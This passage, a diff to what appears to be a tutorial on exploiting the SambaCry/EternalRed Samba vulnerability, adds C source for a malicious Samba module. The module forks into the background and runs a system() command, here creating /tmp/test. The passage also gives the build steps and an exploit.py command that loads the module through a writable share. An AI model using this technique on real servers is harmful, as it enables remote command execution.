@@ -233,3 +233,73 @@ gcc -shared -o reverse.so reverse.o
 ![reverseShell](/img/EternalRed/reverse.png)
 
 
+<h3>Other execution</h3>
+What if we want to do something else. For example run a command. No problem, we need the the same starting methode name, the detachFromParent methode and some small code to run our command. We will use system() in this case.
+For this test, I will create a new folder in /tmp called test. here is the code samble:
+
+```
+#include <stdio.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+
+
+static void detachFromParent(void) {
+    pid_t pid, sid;
+
+    if ( getppid() == 1 ){
+        return;
+    }
+
+    pid = fork();
+
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    if (pid > 0) {
+        exit(EXIT_SUCCESS);
+    }
+
+    umask(0);
+
+    sid = setsid();
+    if (sid < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    if ((chdir("/")) < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+}
+
+int samba_init_module(void)
+{
+    detachFromParent();
+    char command[50];
+
+    strcpy( command, "mkdir /tmp/test" );
+    system(command);
+    return 0;
+}
+
+```
+
+Complie run then execute just like before:
+
+```
+gcc -c -fpic execute.c
+gcc -shared -o execute.so execute.o
+
+
+./exploit.py -t localhost -e execute.so \
+             -s data -r /data/execute.so \
+             -u sambacry -p nosambanocry
+			 
+```
+
+![commandExecution](/img/EternalRed/Commands.png)
